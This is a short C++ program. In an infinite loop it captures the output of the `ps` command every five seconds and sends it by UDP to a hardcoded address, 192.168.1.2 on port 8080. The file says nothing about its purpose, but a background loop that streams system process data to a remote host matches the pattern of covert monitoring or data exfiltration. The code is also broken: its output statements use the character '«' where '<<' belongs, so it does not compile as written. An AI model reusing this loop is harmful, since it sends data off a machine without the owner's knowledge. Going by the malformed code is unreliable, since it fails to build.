#include <iostream>
#include <string>
#include <thread>
#include <chrono>
#include <sstream>
#include <stdexcept>
#include <array>
#include <memory>

#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>

std::string read_process_data() {
std::array<char, 128> buffer;
std::string result;
std::unique_ptr<FILE, decltype(&pclose)> pipe(popen("ps", "r"), pclose);

if (!pipe) {
throw std::runtime_error("popen() failed!");
}

while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr) {
result += buffer.data();
}

return result;
}

void send_data_in_background(const std::string& ip, int port) {
int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
if (sock == -1) {
throw std::runtime_error("Socket creation failed");
}

sockaddr_in addr;
addr.sin_family = AF_INET;
addr.sin_port = htons(port);
addr.sin_addr.s_addr = inet_addr(ip.c_str());

while (true) {
std::string data = read_process_data();

if (sendto(sock, data.c_str(), data.size(), 0, (sockaddr*)&addr, sizeof(addr)) == -1) {
std::cerr « "Error in sending data" « std::endl;
}

std::this_thread::sleep_for(std::chrono::seconds(5));
}

close(sock);
}

int main() {
std::string target_ip = "192.168.1.2"; // Set target IP address
int target_port = 8080; // Set target port

try {
send_data_in_background(target_ip, target_port);
} catch (std::exception& e) {
std::cerr « "Error: " « e.what() « std::endl;
return 1;
}
}